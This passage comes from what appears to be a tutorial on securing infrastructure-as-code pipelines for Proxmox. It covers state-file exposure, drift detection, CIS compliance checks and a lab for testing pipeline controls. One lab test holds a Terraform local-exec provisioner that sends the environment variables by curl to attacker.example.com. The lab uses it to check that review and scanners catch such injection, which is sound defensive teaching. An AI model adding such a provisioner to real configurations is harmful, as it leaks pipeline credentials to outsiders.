# Commit this file to git -- Terraform verifies checksums on init
```

**Ansible collection supply chain risks:**

- **Compromised collections on Galaxy.** Ansible Galaxy does not enforce signing. An attacker can publish a malicious version of a collection.
- **Namespace squatting.** Similar namespace names to popular collections.

**Mitigations:**

```yaml
# requirements.yml -- pin exact versions
collections:
  - name: community.general
    version: "9.5.0"  # Exact version
    source: https://galaxy.ansible.com

  - name: community.vmware
    version: "4.7.0"
```

```bash
# Verify collection integrity
ansible-galaxy collection verify community.general:9.5.0
```

### 8.3 State File Exposure Scenarios

Real-world state file exposure vectors:

1. **Developer laptop theft/loss.** Local state on an unencrypted disk.
2. **Git repository leak.** State file committed to git (even once -- git history preserves it).
3. **S3 bucket misconfiguration.** Public access or overly broad IAM policy on the state bucket.
4. **CI/CD artifact retention.** State file stored as a pipeline artifact accessible to all project members.
5. **Backup exposure.** State file included in unencrypted backups.
6. **Log aggregation.** `terraform plan` output logged to a centralized system, containing sensitive values.

**Detection:**

```bash
# Check if state files were ever committed to git
git log --all --diff-filter=A -- '*.tfstate' '*.tfstate.backup'

# Check for state files in current tree
find . -name '*.tfstate' -o -name '*.tfstate.backup' | head

# .gitignore (mandatory)
echo '*.tfstate' >> .gitignore
echo '*.tfstate.backup' >> .gitignore
echo '.terraform/' >> .gitignore
```

### 8.4 Credential Leakage Through Plan Output and Logs

`terraform plan` and `terraform apply` output can contain sensitive values even when variables are marked `sensitive`.

**Leakage vectors:**

- Provider-level attributes that are not marked sensitive in the provider schema.
- `local-exec` provisioner commands that interpolate secrets.
- Error messages that include attribute values.
- Debug logging (`TF_LOG=DEBUG`) that includes full API request/response bodies.

**Prevention:**

```hcl
# Mark outputs as sensitive
output "proxmox_token" {
  value     = var.proxmox_api_token_secret
  sensitive = true
}

# Use nonsensitive() only when explicitly safe
output "vm_ip" {
  value = nonsensitive(proxmox_vm_qemu.web_server.default_ipv4_address)
}
```

```yaml
# CI/CD: redirect plan output to a file, not stdout
script:
  - terraform plan -out=tfplan.binary -input=false > /dev/null
  - terraform show tfplan.binary > plan-output.txt  # Artifact, not log
```

### 8.5 Privilege Escalation Through IaC Pipeline Compromise

An attacker who compromises the CI/CD pipeline inherits the pipeline's credentials. Since IaC pipelines typically have broad infrastructure permissions, this is a high-value target.

**Attack chain:**

1. Compromise a CI runner (e.g., via container escape, dependency confusion, or stolen runner token).
2. Access environment variables containing Proxmox API tokens, Vault tokens, or cloud credentials.
3. Use those credentials to create new VMs, modify network rules, exfiltrate data, or establish persistence.

**Defense in depth:**

- **Ephemeral runners.** Runners are created for each job and destroyed after. No persistent credential cache.
- **OIDC federation.** Use CI/CD OIDC tokens to authenticate to Vault, which issues short-lived Proxmox credentials. No static secrets in CI environment variables.
- **Network isolation.** Runners can only reach the Proxmox API through a firewall that restricts access to specific endpoints.
- **Job-scoped credentials.** Each job gets credentials scoped to its specific task (plan gets read-only, apply gets write, configure gets different permissions).
- **Audit logging.** All CI/CD actions are logged with job ID, pipeline ID, and user who triggered the pipeline.

### 8.6 Drift Exploitation -- Manual Changes Bypassing Controls

An attacker who gains access to the Proxmox GUI or API directly -- bypassing the IaC pipeline -- can make changes that the pipeline does not detect until the next drift check.

**Attack scenarios:**

- Add a new VM that mines cryptocurrency -- Terraform does not know about resources it does not manage.
- Modify firewall rules to allow lateral movement.
- Change a VM's cloud-init to inject a backdoor on next reboot.
- Attach additional network interfaces to bridge security zones.

**Detection (see section 9):**

- Continuous `terraform plan` to detect drift on managed resources.
- Proxmox API event monitoring to detect unmanaged resource creation.
- Host-based auditd to detect direct CLI changes (`qm`, `pvesh`, `pct`).

---

## 9. Monitoring and Compliance

### 9.1 Drift Detection -- Comparing Actual vs Desired State

**Terraform drift detection (scheduled):**

```bash
#!/usr/bin/env bash
# scripts/drift-check.sh -- run via cron every 4 hours
set -euo pipefail

LOG_DIR="/var/log/terraform-drift"
mkdir -p "${LOG_DIR}"
TIMESTAMP=$(date -u +%Y-%m-%dT%H%M%SZ)
LOGFILE="${LOG_DIR}/drift-${TIMESTAMP}.json"

cd /opt/iac/terraform/proxmox
terraform init -input=false >/dev/null 2>&1
terraform plan -detailed-exitcode -input=false -out=/dev/null 2>&1 | tee "${LOGFILE}"

EXIT_CODE=${PIPESTATUS[0]}
# Exit codes: 0 = no changes, 1 = error, 2 = changes detected (drift)

if [ "${EXIT_CODE}" -eq 2 ]; then
  # Drift detected -- alert
  curl -s -X POST https://alertmanager.internal/api/v2/alerts \
    -H "Content-Type: application/json" \
    -d "[{
      \"labels\": {
        \"alertname\": \"TerraformDrift\",
        \"severity\": \"warning\",
        \"environment\": \"production\"
      },
      \"annotations\": {
        \"summary\": \"Infrastructure drift detected in Proxmox production\",
        \"runbook\": \"https://wiki.internal/runbooks/terraform-drift\"
      }
    }]"
elif [ "${EXIT_CODE}" -eq 1 ]; then
  # Error -- escalate
  echo "Terraform plan failed -- investigate" >&2
  exit 1
fi
```

**Proxmox API-based drift detection for unmanaged resources:**

```bash
#!/usr/bin/env bash
# Detect VMs/containers not managed by Terraform
set -euo pipefail

API_URL="https://pve-mgmt.internal:8006/api2/json"
TOKEN="PVEAPIToken=monitor@pve!drift-check=xxxxx"

# Get all VMs from Proxmox API
PROXMOX_VMS=$(curl -s -H "Authorization: ${TOKEN}" \
  "${API_URL}/cluster/resources?type=vm" | jq -r '.data[].vmid')

# Get all VMs from Terraform state
TERRAFORM_VMS=$(terraform state list 2>/dev/null | \
  grep 'proxmox_vm_qemu\|proxmox_lxc' | \
  xargs -I{} terraform state show {} 2>/dev/null | \
  grep -oP 'vmid\s*=\s*\K\d+')

# Find unmanaged VMs
for vmid in ${PROXMOX_VMS}; do
  if ! echo "${TERRAFORM_VMS}" | grep -q "^${vmid}$"; then
    echo "WARNING: VMID ${vmid} exists in Proxmox but is NOT managed by Terraform"
  fi
done
```

### 9.2 Continuous Compliance Verification -- Automated CIS Checks Post-Provisioning

```yaml
---
# ansible/playbooks/cis-compliance-check.yml
- name: CIS Benchmark compliance check for Proxmox hosts
  hosts: proxmox_nodes
  become: true
  gather_facts: true
  vars:
    compliance_report_dir: /var/log/compliance
  tasks:
    - name: Create report directory
      ansible.builtin.file:
        path: "{{ compliance_report_dir }}"
        state: directory
        mode: "0700"

    # CIS 1.1 - Filesystem Configuration
    - name: CIS 1.1.1 - Check /tmp is a separate partition
      ansible.builtin.command: findmnt /tmp
      register: tmp_mount
      changed_when: false
      failed_when: false

    # CIS 5.2 - SSH Server Configuration
    - name: CIS 5.2.1 - Check SSH Protocol version
      ansible.builtin.command: sshd -T
      register: sshd_config
      changed_when: false

    - name: CIS 5.2 - Validate SSH settings
      ansible.builtin.assert:
        that:
          - "'protocol 2' in sshd_config.stdout or 'protocol' not in sshd_config.stdout"
          - "'permitrootlogin prohibit-password' in sshd_config.stdout or 'permitrootlogin no' in sshd_config.stdout"
          - "'passwordauthentication no' in sshd_config.stdout"
          - "'x11forwarding no' in sshd_config.stdout"
          - "'maxauthtries 3' in sshd_config.stdout or 'maxauthtries 4' in sshd_config.stdout"
        fail_msg: "SSH configuration does not meet CIS benchmark"
      register: ssh_compliance

    # CIS 3.x - Network Configuration
    - name: CIS 3.1 - Check IP forwarding
      ansible.builtin.command: sysctl net.ipv4.ip_forward
      register: ip_forward
      changed_when: false

    - name: Generate compliance report
      ansible.builtin.template:
        src: templates/compliance-report.j2
        dest: "{{ compliance_report_dir }}/cis-report-{{ ansible_date_time.date }}.json"
        mode: "0600"
```

### 9.3 Infrastructure Change Auditing -- Who Changed What When

**Proxmox task log monitoring:**

```bash
# Query Proxmox API for recent task history
curl -s \
  -H "Authorization: PVEAPIToken=monitor@pve!audit=xxxxx" \
  "https://pve-mgmt.internal:8006/api2/json/cluster/tasks?limit=50" \
  | jq '.data[] | {
    user: .user,
    node: .node,
    type: .type,
    id: .id,
    starttime: (.starttime | todate),
    status: .status
  }'
```

**Git-based audit trail:**

```bash
# Who changed what in the IaC repository
git log --format="%H %ai %an %s" -- terraform/ ansible/

# Detailed diff for a specific commit
git show --stat <commit-hash>
git diff <commit-hash>^..<commit-hash> -- terraform/proxmox/
```

**Centralized audit log collection:**

```yaml
# ansible/playbooks/audit-forwarding.yml
- name: Configure audit log forwarding to SIEM
  hosts: proxmox_nodes
  become: true
  tasks:
    - name: Configure rsyslog to forward PVE audit logs
      ansible.builtin.copy:
        content: |
          # Forward PVE API access logs
          if $programname == 'pveproxy' then @@siem.internal:514;RSYSLOG_SyslogProtocol23Format

          # Forward authentication events
          if $programname == 'pvedaemon' then @@siem.internal:514;RSYSLOG_SyslogProtocol23Format

          # Forward cluster events
          if $programname == 'pmxcfs' then @@siem.internal:514;RSYSLOG_SyslogProtocol23Format
        dest: /etc/rsyslog.d/50-pve-siem.conf
        mode: "0644"
      notify: Restart rsyslog

  handlers:
    - name: Restart rsyslog
      ansible.builtin.service:
        name: rsyslog
        state: restarted
```

### 9.4 Alerting on Unauthorized Changes

```yaml
# Prometheus alert rules for Proxmox drift and unauthorized changes
groups:
  - name: proxmox_iac_security
    interval: 5m
    rules:
      - alert: UnmanagedVMCreated
        expr: proxmox_vm_count > on(node) terraform_managed_vm_count
        for: 10m
        labels:
          severity: critical
          team: infrastructure
        annotations:
          summary: "Unmanaged VM detected on {{ $labels.node }}"
          description: >
            Proxmox reports more VMs than Terraform manages on node {{ $labels.node }}.
            This may indicate unauthorized VM creation bypassing the IaC pipeline.
          runbook: https://wiki.internal/runbooks/unmanaged-vm

      - alert: TerraformDriftDetected
        expr: terraform_drift_resources_changed > 0
        for: 0m
        labels:
          severity: warning
          team: infrastructure
        annotations:
          summary: "Terraform drift detected in {{ $labels.workspace }}"
          description: >
            {{ $value }} resources have drifted from desired state in workspace {{ $labels.workspace }}.

      - alert: ProxmoxAPIBruteForce
        expr: rate(proxmox_api_auth_failures_total[5m]) > 5
        for: 2m
        labels:
          severity: critical
          team: security
        annotations:
          summary: "Possible brute force on Proxmox API from {{ $labels.source_ip }}"
```

### 9.5 Compliance Reporting Automation

```bash
#!/usr/bin/env bash
# scripts/compliance-report.sh -- generates periodic compliance report
set -euo pipefail

REPORT_DATE=$(date -u +%Y-%m-%d)
REPORT_DIR="/var/reports/compliance/${REPORT_DATE}"
mkdir -p "${REPORT_DIR}"

echo "=== Compliance Report: ${REPORT_DATE} ===" > "${REPORT_DIR}/summary.txt"

# 1. Terraform state consistency
echo "--- Terraform State ---" >> "${REPORT_DIR}/summary.txt"
cd /opt/iac/terraform/proxmox
terraform plan -detailed-exitcode -input=false > "${REPORT_DIR}/terraform-plan.txt" 2>&1 || true

# 2. InSpec CIS compliance
echo "--- CIS Compliance ---" >> "${REPORT_DIR}/summary.txt"
inspec exec profiles/proxmox-baseline \
  --target ssh://deploy@pve-node-01 \
  --reporter json:"${REPORT_DIR}/inspec-results.json" \
  cli:"${REPORT_DIR}/inspec-cli.txt" || true

# 3. Secret scanning
echo "--- Secret Scan ---" >> "${REPORT_DIR}/summary.txt"
cd /opt/iac
trufflehog filesystem --directory=. --json > "${REPORT_DIR}/secrets-scan.json" 2>&1 || true

# 4. Policy compliance
echo "--- Policy Compliance ---" >> "${REPORT_DIR}/summary.txt"
cd /opt/iac/terraform/proxmox
terraform plan -out=tfplan.binary -input=false >/dev/null 2>&1
terraform show -json tfplan.binary > /tmp/tfplan.json
conftest test /tmp/tfplan.json --policy /opt/iac/policy/ --output json > "${REPORT_DIR}/policy-results.json" 2>&1 || true
rm -f /tmp/tfplan.json tfplan.binary

echo "Report generated at ${REPORT_DIR}"
```

### 9.6 Evidence Collection for Audits

For compliance frameworks (SOC 2, ISO 27001, PCI DSS), automated evidence collection reduces the burden of periodic audits.

**Evidence types and collection methods:**

| Evidence | Source | Collection Method | Frequency |
|----------|--------|------------------|-----------|
| Change approval records | GitLab merge request history | `gh api` / GitLab API | Per change |
| Access control lists | Proxmox ACL configuration | `pveum acl list` API call | Weekly |
| Encryption status | Proxmox storage configuration | API + InSpec | Weekly |
| Vulnerability scans | Trivy, tfsec, trufflehog | CI pipeline artifacts | Per commit |
| Configuration baselines | Ansible --check --diff | Scheduled cron job | Daily |
| Incident response logs | SIEM, Proxmox task logs | API + log aggregation | Continuous |
| Firewall rule inventory | Proxmox firewall API | `pvesh get /cluster/firewall/rules` | Weekly |

```bash
# Automated evidence snapshot
pvesh get /access/acl --output-format json > "${REPORT_DIR}/acl-snapshot.json"
pvesh get /cluster/firewall/rules --output-format json > "${REPORT_DIR}/firewall-rules.json"
pvesh get /cluster/resources --output-format json > "${REPORT_DIR}/resource-inventory.json"

# Hash evidence files for integrity
sha256sum "${REPORT_DIR}"/* > "${REPORT_DIR}/SHA256SUMS"
```

---

## 10. Lab: Secure IaC Pipeline

This lab builds an end-to-end secure IaC pipeline using GitLab CI, Terraform, Ansible, HashiCorp Vault, and Proxmox VE. The pipeline provisions VMs with security controls at every stage: scanning, approval, testing, deployment, and verification. After building the pipeline, you will attempt to bypass its controls to validate their effectiveness.

### 10.1 Architecture Overview

```
+-------------------------------------------------------------------+
|                     Secure IaC Pipeline Lab                        |
+-------------------------------------------------------------------+
|                                                                   |
|  [Developer Workstation]                                          |
|       |                                                           |
|       v                                                           |
|  [GitLab Server]  -----> [GitLab Runner (ephemeral)]              |
|       |                        |                                  |
|       |    +-----------+-------+-----------+----------+           |
|       |    |           |       |           |          |           |
|       v    v           v       v           v          v           |
|    Validate      Secret Scan  Policy    TF Plan   TF Apply       |
|    (fmt,lint)    (trufflehog) (conftest) (r/o)    (gated)        |
|                                                      |           |
|                                              [Vault Server]      |
|                                              (dynamic creds)     |
|                                                      |           |
|                                              [Proxmox API]       |
|                                              (scoped token)      |
|                                                      |           |
|                                              [Ansible Config]    |
|                                              (post-provision)    |
|                                                      |           |
|                                              [InSpec Verify]     |
|                                              (compliance)        |
+-------------------------------------------------------------------+
```

### 10.2 Prerequisites

- Proxmox VE 8.x cluster (minimum single node for lab)
- GitLab CE/EE instance (self-hosted or gitlab.com)
- HashiCorp Vault server (can run as VM on Proxmox)
- GitLab Runner registered to the project
- Network connectivity between runner, Vault, and Proxmox API

### 10.3 Step 1: Vault Configuration

**Deploy Vault and configure Proxmox secrets engine:**

```bash
# Initialize Vault (first time only)
vault operator init -key-shares=5 -key-threshold=3

# After unsealing, enable AppRole for GitLab CI
vault auth enable approle

# Create policy for the IaC pipeline
vault policy write iac-pipeline - <<'POLICY'
# Read Proxmox API credentials
path "secret/data/proxmox/terraform" {
  capabilities = ["read"]
}

path "secret/data/proxmox/ansible" {
  capabilities = ["read"]
}

# Encrypt/decrypt state files via transit
path "transit/encrypt/tf-state" {
  capabilities = ["update"]
}

path "transit/decrypt/tf-state" {
  capabilities = ["update"]
}
POLICY

# Create AppRole for GitLab CI
vault write auth/approle/role/gitlab-iac \
  secret_id_ttl=10m \
  token_ttl=20m \
  token_max_ttl=30m \
  token_policies="iac-pipeline" \
  bind_secret_id=true \
  secret_id_num_uses=1

# Store Proxmox credentials in Vault
vault kv put secret/proxmox/terraform \
  token_id="terraform@pve!iac-token" \
  token_secret="$(uuidgen)"

vault kv put secret/proxmox/ansible \
  token_id="ansible@pve!automation" \
  token_secret="$(uuidgen)"

# Get AppRole credentials for GitLab CI variables
ROLE_ID=$(vault read -field=role_id auth/approle/role/gitlab-iac/role-id)
echo "Set VAULT_ROLE_ID in GitLab CI/CD variables: ${ROLE_ID}"
# SECRET_ID is generated per pipeline run (see CI config below)
```

### 10.4 Step 2: Proxmox API User and Token Setup

```bash
# On the Proxmox node:

# Create Terraform service user
pveum user add terraform@pve --comment "Terraform IaC - lab pipeline"
pveum user token add terraform@pve iac-token --privsep 1 \
  --comment "Lab IaC pipeline - scoped"

# Create Ansible service user
pveum user add ansible@pve --comment "Ansible automation - lab pipeline"
pveum user token add ansible@pve automation --privsep 1 \
  --comment "Lab Ansible post-config"

# Create monitoring user (read-only)
pveum user add monitor@pve --comment "Monitoring and drift detection"
pveum user token add monitor@pve readonly --privsep 1

# Custom roles
pveum role add LabTerraform --privs \
  "VM.Allocate VM.Clone VM.Config.Disk VM.Config.CPU VM.Config.Memory \
   VM.Config.Network VM.Config.Options VM.PowerMgmt \
   Datastore.AllocateSpace Datastore.Audit SDN.Use"

pveum role add LabAnsible --privs \
  "VM.Monitor VM.Audit VM.Console Sys.Audit"

pveum role add LabMonitor --privs \
  "VM.Audit Sys.Audit Datastore.Audit SDN.Audit"

# ACL assignments -- scoped paths
pveum acl modify /vms --roles LabTerraform --tokens terraform@pve!iac-token
pveum acl modify /storage/local-zfs --roles LabTerraform --tokens terraform@pve!iac-token
pveum acl modify / --roles LabMonitor --tokens monitor@pve!readonly
pveum acl modify /vms --roles LabAnsible --tokens ansible@pve!automation
```

### 10.5 Step 3: Repository Structure

```
lab-iac-pipeline/
├── .gitlab-ci.yml
├── .gitignore
├── .sops.yaml
├── policy/
│   ├── naming.rego
│   ├── resource-limits.rego
│   ├── container-security.rego
│   ├── encryption.rego
│   ├── network-policy.rego
│   └── tags.rego
├── terraform/
│   ├── main.tf
│   ├── variables.tf
│   ├── outputs.tf
│   ├── providers.tf
│   ├── backend.tf
│   └── environments/
│       ├── lab.tfvars
│       └── production.tfvars
├── ansible/
│   ├── ansible.cfg
│   ├── inventory/
│   │   └── proxmox.yml
│   ├── playbooks/
│   │   ├── hardening.yml
│   │   └── monitoring-agent.yml
│   ├── roles/
│   │   └── base-hardening/
│   │       ├── tasks/main.yml
│   │       ├── handlers/main.yml
│   │       └── templates/
│   │           └── sshd_config.j2
│   └── group_vars/
│       └── all/
│           └── vault.yml  # ansible-vault encrypted
├── profiles/
│   └── proxmox-baseline/
│       ├── inspec.yml
│       └── controls/
│           ├── ssh.rb
│           └── kernel.rb
└── scripts/
    ├── drift-check.sh
    └── vault-auth.sh
```

### 10.6 Step 4: Core Terraform Configuration

**`terraform/providers.tf`:**

```hcl
terraform {
  required_version = ">= 1.7.0"

  required_providers {
    proxmox = {
      source  = "Telmate/proxmox"
      version = "3.0.1-rc4"
    }
    vault = {
      source  = "hashicorp/vault"
      version = "~> 4.2.0"
    }
  }
}

provider "vault" {
  address = var.vault_address
  # Auth via AppRole -- credentials injected by CI
}

data "vault_kv_secret_v2" "proxmox" {
  mount = "secret"
  name  = "proxmox/terraform"
}

provider "proxmox" {
  pm_api_url          = var.proxmox_api_url
  pm_api_token_id     = data.vault_kv_secret_v2.proxmox.data["token_id"]
  pm_api_token_secret = data.vault_kv_secret_v2.proxmox.data["token_secret"]
  pm_tls_insecure     = false
  pm_parallel         = 2
  pm_log_enable       = false
}
```

**`terraform/main.tf`:**

```hcl
resource "proxmox_vm_qemu" "lab_vm" {
  count       = var.vm_count
  name        = "lab-${var.environment}-${format("%02d", count.index + 1)}"
  target_node = var.proxmox_node
  vmid        = var.base_vmid + count.index
  desc        = "Lab VM managed by IaC pipeline"

  clone   = var.template_name
  os_type = "cloud-init"
  agent   = 1

  cores   = var.vm_cores
  sockets = 1
  memory  = var.vm_memory
  cpu     = "host"

  scsihw = "virtio-scsi-single"
  bios   = "ovmf"

  disks {
    scsi {
      scsi0 {
        disk {
          size     = var.vm_disk_size
          storage  = var.storage_pool
          iothread = true
          discard  = true
        }
      }
    }
  }

  network {
    model  = "virtio"
    bridge = var.network_bridge
    tag    = var.vlan_tag
  }

  ipconfig0  = "ip=${var.vm_ip_base}${count.index + 10}/24,gw=${var.gateway}"
  nameserver = var.dns_server
  ciuser     = "deploy"
  sshkeys    = file(var.ssh_public_key_path)

  lifecycle {
    prevent_destroy = false  # Lab environment -- allow destroy
  }

  tags = join(",", [
    "terraform",
    "owner-${var.owner}",
    "environment-${var.environment}",
    var.environment == "production" ? "hardened" : "lab"
  ])
}
```

**`terraform/variables.tf`:**

```hcl
variable "vault_address" {
  type        = string
  description = "HashiCorp Vault server URL"
}

variable "proxmox_api_url" {
  type        = string
  description = "Proxmox API endpoint"
}

variable "proxmox_node" {
  type        = string
  description = "Target Proxmox node"
}

variable "environment" {
  type        = string
  description = "Deployment environment"
  validation {
    condition     = contains(["lab", "staging", "production"], var.environment)
    error_message = "Environment must be lab, staging, or production."
  }
}

variable "vm_count" {
  type        = number
  default     = 2
  description = "Number of VMs to provision"
}

variable "vm_cores" {
  type    = number
  default = 2
}

variable "vm_memory" {
  type    = number
  default = 4096
}

variable "vm_disk_size" {
  type    = string
  default = "30G"
}

variable "template_name" {
  type    = string
  default = "debian-12-hardened-template"
}

variable "storage_pool" {
  type    = string
  default = "local-zfs"
}

variable "network_bridge" {
  type    = string
  default = "vmbr1"
}

variable "vlan_tag" {
  type    = number
  default = 100
}

variable "vm_ip_base" {
  type        = string
  description = "IP address base (e.g., 10.50.1.)"
}

variable "gateway" {
  type = string
}

variable "dns_server" {
  type = string
}

variable "ssh_public_key_path" {
  type    = string
  default = "~/.ssh/deploy_ed25519.pub"
}

variable "base_vmid" {
  type    = number
  default = 500
}

variable "owner" {
  type    = string
  default = "iac-pipeline"
}
```

### 10.7 Step 5: Complete GitLab CI Pipeline

```yaml
# .gitlab-ci.yml
stages:
  - validate
  - security
  - plan
  - approve
  - apply
  - configure
  - verify

default:
  before_script:
    # Authenticate to Vault via AppRole
    - |
      if [ -n "${VAULT_ROLE_ID}" ]; then
        export VAULT_ADDR="${VAULT_ADDRESS}"
        SECRET_ID=$(vault write -f -field=secret_id auth/approle/role/gitlab-iac/secret-id)
        VAULT_TOKEN=$(vault write -field=token auth/approle/login \
          role_id="${VAULT_ROLE_ID}" secret_id="${SECRET_ID}")
        export VAULT_TOKEN
      fi

variables:
  TF_ROOT: "${CI_PROJECT_DIR}/terraform"
  VAULT_ADDRESS: "https://vault.lab.internal:8200"
  TF_VAR_vault_address: "${VAULT_ADDRESS}"
  TF_VAR_proxmox_api_url: "https://pve.lab.internal:8006/api2/json"
  TF_VAR_proxmox_node: "pve-lab-01"
  TF_VAR_environment: "lab"
  TF_VAR_vm_ip_base: "10.50.1."
  TF_VAR_gateway: "10.50.1.1"
  TF_VAR_dns_server: "10.50.1.2"

# ========== VALIDATE ==========
terraform_fmt:
  stage: validate
  image:
    name: hashicorp/terraform:1.7
    entrypoint: [""]
  script:
    - cd ${TF_ROOT}
    - terraform fmt -check -recursive -diff
  rules:
    - changes: [terraform/**/*]

terraform_validate:
  stage: validate
  image:
    name: hashicorp/terraform:1.7
    entrypoint: [""]
  script:
    - cd ${TF_ROOT}
    - terraform init -backend=false
    - terraform validate
  rules:
    - changes: [terraform/**/*]

ansible_lint:
  stage: validate
  image: cytopia/ansible-lint:latest
  script:
    - cd ${CI_PROJECT_DIR}/ansible
    - ansible-lint playbooks/ roles/
  rules:
    - changes: [ansible/**/*]

rego_test:
  stage: validate
  image:
    name: openpolicyagent/opa:0.62.0
    entrypoint: [""]
  script:
    - cd ${CI_PROJECT_DIR}/policy
    - opa test . -v
  rules:
    - changes: [policy/**/*]

# ========== SECURITY ==========
secret_detection:
  stage: security
  image: ghcr.io/trufflesecurity/trufflehog:latest
  script:
    - trufflehog filesystem --directory=${CI_PROJECT_DIR} --fail --json > trufflehog.json
  artifacts:
    paths: [trufflehog.json]
    when: always
  allow_failure: false

tfsec:
  stage: security
  image: aquasec/tfsec:latest
  script:
    - tfsec ${TF_ROOT} --format json --out tfsec.json --soft-fail
  artifacts:
    paths: [tfsec.json]
    when: always

# ========== PLAN ==========
terraform_plan:
  stage: plan
  image:
    name: hashicorp/terraform:1.7
    entrypoint: [""]
  script:
    - cd ${TF_ROOT}
    - terraform init
    - terraform plan -var-file=environments/lab.tfvars -out=tfplan.binary -input=false
    - terraform show -json tfplan.binary > tfplan.json
    - terraform show tfplan.binary > tfplan.txt
  artifacts:
    paths:
      - ${TF_ROOT}/tfplan.binary
      - ${TF_ROOT}/tfplan.json
      - ${TF_ROOT}/tfplan.txt
    expire_in: 2 hours
  rules:
    - changes: [terraform/**/*]

policy_evaluation:
  stage: plan
  image:
    name: openpolicyagent/conftest:latest
    entrypoint: [""]
  script:
    - conftest test ${TF_ROOT}/tfplan.json
        --policy ${CI_PROJECT_DIR}/policy/
        --all-namespaces
        --output json > policy-results.json
  artifacts:
    paths: [policy-results.json]
    when: always
  allow_failure: false
  needs:
    - terraform_plan

# ========== APPROVE ==========
manual_approval:
  stage: approve
  script:
    - echo "Approved by ${GITLAB_USER_LOGIN} at $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    - echo "Plan artifact review required before approval"
  when: manual
  allow_failure: false
  needs:
    - terraform_plan
    - policy_evaluation
    - secret_detection
  rules:
    - if: $CI_COMMIT_BRANCH == "main"

# ========== APPLY ==========
terraform_apply:
  stage: apply
  image:
    name: hashicorp/terraform:1.7
    entrypoint: [""]
  script:
    - cd ${TF_ROOT}
    - terraform init
    - terraform apply -input=false tfplan.binary
  dependencies:
    - terraform_plan
  needs:
    - terraform_plan
    - manual_approval
  rules:
    - if: $CI_COMMIT_BRANCH == "main"

# ========== CONFIGURE ==========
ansible_hardening:
  stage: configure
  image: cytopia/ansible:latest
  script:
    - cd ${CI_PROJECT_DIR}/ansible
    - |
      export ANSIBLE_VAULT_PASSWORD_FILE=/tmp/.vault-pass
      vault kv get -field=ansible_vault_password secret/proxmox/ansible > /tmp/.vault-pass
      chmod 0400 /tmp/.vault-pass
    - ansible-playbook -i inventory/proxmox.yml playbooks/hardening.yml
    - rm -f /tmp/.vault-pass
  needs:
    - terraform_apply
  rules:
    - if: $CI_COMMIT_BRANCH == "main"

# ========== VERIFY ==========
inspec_compliance:
  stage: verify
  image: chef/inspec:latest
  script:
    - cd ${CI_PROJECT_DIR}
    - |
      inspec exec profiles/proxmox-baseline \
        --target ssh://deploy@10.50.1.10 \
        --reporter json:inspec-results.json cli \
        --chef-license=accept-no-persist
  artifacts:
    paths: [inspec-results.json]
    when: always
  needs:
    - ansible_hardening
  rules:
    - if: $CI_COMMIT_BRANCH == "main"

drift_baseline:
  stage: verify
  image: cytopia/ansible:latest
  script:
    - cd ${CI_PROJECT_DIR}/ansible
    - ansible-playbook -i inventory/proxmox.yml playbooks/hardening.yml --check --diff
  needs:
    - ansible_hardening
  allow_failure: true
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
```

### 10.8 Step 6: Security Control Testing

After the pipeline is operational, test each security control by attempting to bypass it. Document the result of each test.

**Test 1: Attempt to commit hardcoded credentials**

```bash
# Add a hardcoded API token to a Terraform file
echo 'pm_api_token_secret = "12345678-abcd-efgh-ijkl-123456789012"' >> terraform/main.tf
git add terraform/main.tf
git commit -m "test: add hardcoded credential"
git push

# Expected: secret_detection job fails, pipeline blocked
# Verify: check trufflehog.json artifact for the finding
```

**Test 2: Attempt to create a privileged container**

```hcl
# Add to terraform/main.tf
resource "proxmox_lxc" "malicious" {
  hostname     = "evil-container"
  target_node  = "pve-lab-01"
  ostemplate   = "local:vztmpl/debian-12-standard_12.2-1_amd64.tar.zst"
  unprivileged = false  # Privileged!
  cores        = 2
  memory       = 1024
  rootfs {
    storage = "local-zfs"
    size    = "10G"
  }
  network {
    name   = "eth0"
    bridge = "vmbr1"
    ip     = "10.50.1.99/24"
  }
  tags = "terraform,environment-lab"
}
```

```bash
git add terraform/main.tf
git commit -m "test: attempt privileged container"
git push

# Expected: policy_evaluation job fails with container-security.rego violation
# Verify: policy-results.json contains denial message about privileged container
```

**Test 3: Attempt to bypass naming convention**

```hcl
# Modify VM name to violate naming policy
resource "proxmox_vm_qemu" "rogue" {
  name        = "my-cool-server"  # Does not match <role>-<env>-<nn>
  target_node = "pve-lab-01"
  # ...
}
```

```bash
# Expected: policy_evaluation job fails with naming.rego violation
```

**Test 4: Attempt to access Vault secrets from unauthorized path**

```bash
# From the GitLab runner (if you can exec into it):
vault kv get secret/production/database
# Expected: permission denied -- the iac-pipeline policy only allows proxmox/* paths
```

**Test 5: Attempt to apply without approval**

```bash
# Push directly to main without merge request
# Expected: manual_approval gate blocks terraform_apply
# Even if the gate is bypassed (e.g., by API), the runner's scoped token
# limits the blast radius
```

**Test 6: Inject malicious code in a PR**

```hcl
# Add a local-exec provisioner that exfiltrates environment variables
resource "null_resource" "exfil" {
  provisioner "local-exec" {
    command = "env | curl -X POST -d @- https://attacker.example.com/collect"
  }
}
```

```bash
# Expected: code review should catch this. Additionally:
# - tfsec flags the use of local-exec provisioners
# - The reviewer should reject any local-exec/remote-exec without justification
# - Network egress from the runner should be restricted to internal endpoints only
```

### 10.9 Step 7: Verification Matrix

After completing all tests, fill in the verification matrix:

| Control | Test | Expected Outcome | Actual Outcome | Status |
|---------|------|-------------------|----------------|--------|
| Secret scanning | Hardcoded credential commit | Pipeline blocked at security stage | | |
| Container policy | Privileged LXC creation | Policy evaluation denial | | |
| Naming policy | Non-compliant VM name | Policy evaluation denial | | |
| Vault access control | Unauthorized path read | Permission denied | | |
| Approval gate | Direct apply without approval | Pipeline blocked at approve stage | | |
| Code injection | Malicious local-exec PR | Review catch + tfsec warning | | |
| Resource limits | VM exceeding max cores | Policy evaluation denial | | |
| Network policy | Untagged production VM | Policy evaluation denial | | |
| Drift detection | Manual GUI change | Detected in drift_baseline job | | |
| Tag compliance | Missing required tags | Policy evaluation denial | | |

### 10.10 Extending the Lab

Once the base pipeline is operational and all controls verified:

1. **Add SOPS integration.** Encrypt environment-specific variables with SOPS and decrypt them in the pipeline using age keys stored in Vault.
2. **Implement blue-green deployment.** Use Terraform workspaces to provision parallel environments and test cutover.
3. **Add Slack/Mattermost notifications.** Notify the team on pipeline failures, drift detection, and approval requests.
4. **Integrate with a SIEM.** Forward Proxmox audit logs and pipeline events to a centralized SIEM for correlation.
5. **Implement automatic drift remediation.** When drift is detected, automatically trigger a pipeline run to enforce desired state (with appropriate safeguards against infinite loops).

---

## References

- Terraform Proxmox Provider (Telmate): https://registry.terraform.io/providers/Telmate/proxmox/latest/docs
